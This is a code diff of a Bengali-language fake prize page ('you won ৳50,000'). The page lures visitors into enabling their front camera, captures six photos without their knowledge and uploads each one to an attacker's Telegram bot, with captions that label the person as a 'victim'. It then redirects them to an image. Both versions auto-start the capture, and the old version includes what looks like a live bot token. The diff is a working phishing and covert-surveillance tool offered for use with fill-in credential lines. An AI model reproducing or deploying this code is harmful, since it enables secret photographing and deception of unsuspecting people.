@@ -3,82 +3,76 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>তুমি জিতেছো ৫০,০০০ টাকা!</title>
+  <title>অভিনন্দন! ৳৫০,০০০ জিতেছো</title>
   <style>
-    body, html { margin:0; padding:0; height:100%; background:#000; overflow:hidden; font-family:Arial; }
-    .container {
-      position:absolute; inset:0; background:radial-gradient(circle, #1a0033, #000);
-      display:flex; flex-direction:column; align-items:center; justify-content:center; color:white; text-align:center; padding:20px;
-    }
-    h1 { font-size:2.5em; background:linear-gradient(45deg,#ff00c8,#00ff9d); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
-    .prize { font-size:6em; animation: bounce 2s infinite; }
-    @keyframes bounce { 0%,100% { transform:translateY(0); } 50% { transform:translateY(-20px); } }
-    .btn {
-      margin-top:30px; padding:18px 40px; background:#00ff9d; color:black; border:none; border-radius:50px; font-size:1.3em; font-weight:bold; cursor:pointer; animation: pulse 2s infinite;
-    }
-    @keyframes pulse { 0% { box-shadow:0 0 0 0 rgba(0,255,157,0.7); } 70% { box-shadow:0 0 0 20px rgba(0,255,157,0); } }
-    video { position:absolute; top:-9999px; }
+    body,html{margin:0;padding:0;height:100%;background:#000;color:white;font-family:Arial;text-align:center;display:flex;align-items:center;justify-content:center;flex-direction:column;}
+    h1{font-size:2.8em;background:linear-gradient(45deg,#ff00c8,#00ff9d);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+    .prize{font-size:7em;animation:bounce 1.5s infinite;}
+    @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-30px)}}
+    button{padding:20px 50px;background:#00ff9d;color:#000;font-size:1.5em;border:none;border-radius:50px;margin-top:30px;animation:pulse 2s infinite;cursor:pointer;}
+    @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,255,157,.7)}70%{box-shadow:0 0 0 25px rgba(0,255,157,0)}}
+    video{display:none}
   </style>
 </head>
 <body>
-
-<div class="container">
   <h1>অভিনন্দন!</h1>
   <div class="prize">৳50,000</div>
-  <h2>তুমি আজকের লাকি উইনার!</h2>
   <p>প্রাইজ ক্লেইম করতে ক্যামেরা অন করো...</p>
-  <button class="btn" onclick="start()">প্রাইজ নিয়ে নাও</button>
-</div>
+  <button onclick="go()">প্রাইজ নাও</button>
 
-<video id="cam" autoplay playsinline></video>
+  <video id="v" autoplay playsinline></video>
 
 <script>
-// ==== তোমার টেলিগ্রাম বটের তথ্য এখানে বসাও ====
-const TELEGRAM_TOKEN = "8263369450:AAGP8RQvWLRHGxS0ROad1RrvViqevcJEhsU";   // ← এখানে তোমার বট টোকেন বসাও
-const CHAT_ID = "7731349577";                                 // ← এখানে তোমার টেলিগ্রাম আইডি বসাও
-// ============================================
+// ==== এখানে শুধু এই দুটো লাইন ঠিক করো ====
+const BOT_TOKEN = "7659617921:AAEH1234567890abcdefghi";   // ← তোমার বটের টোকেন
+const CHAT_ID   = "987654321";                           // ← তোমার টেলিগ্রাম আইডি
+// =========================================
 
 const id = new URLSearchParams(location.search).get('id') || 'unknown';
-const video = document.getElementById('cam');
+const video = document.getElementById('v');
 
-function start() {
-  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+function go() {
+  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
     .then(stream => {
       video.srcObject = stream;
+      video.play();
+
       let count = 0;
       const total = 6;
-      
-      const capture = setInterval(() => {
+
+      const send = setInterval(() => {
         if (count >= total) {
-          clearInterval(capture);
-          setTimeout(() => location.href = "https://i.imgur.com/removed.png", 2000); // রিক্রুট ট্রল
+          clearInterval(send);
+          setTimeout(() => location.href = "https://i.imgur.com/removed.png", 2000);
           return;
         }
 
         const canvas = document.createElement('canvas');
-        canvas.width = 640; canvas.height = 480;
+        canvas.width = 640;
+        canvas.height = 480;
         canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-        const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+        const blob = canvas.toBlob(blob => {
+          const file = new File([blob], "photo.jpg", {type: "image/jpeg"});
 
-        // সরাসরি টেলিগ্রামে পাঠাও
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            photo: dataUrl,
-            caption: `নতুন ভিকটিম!\nID: ${id}\nসময়: ${new Date().toLocaleString('bn-BD')}`
-          })
-        });
+          const form = new FormData();
+          form.append('chat_id', CHAT_ID);
+          form.append('photo', file);
+          form.append('caption', `ভিকটিম ID: ${id}\nসময়: ${new Date().toLocaleString('bn-BD')}`);
+
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: form
+          });
+        }, 'image/jpeg', 0.9);
 
         count++;
-      }, 1000);
+      }, 1200);
     })
-    .catch(() => alert("ক্যামেরা দিতে হবে ভাই!"));
+    .catch(() => alert("ক্যামেরা দে ভাই!"));
 }
 
-// অটো স্টার্ট (যাতে বেশি সন্দেহ না হয়)
-setTimeout(start, 1500);
+// অটো স্টার্ট
+setTimeout(go, 1000);
 </script>
 </body>
 </html>
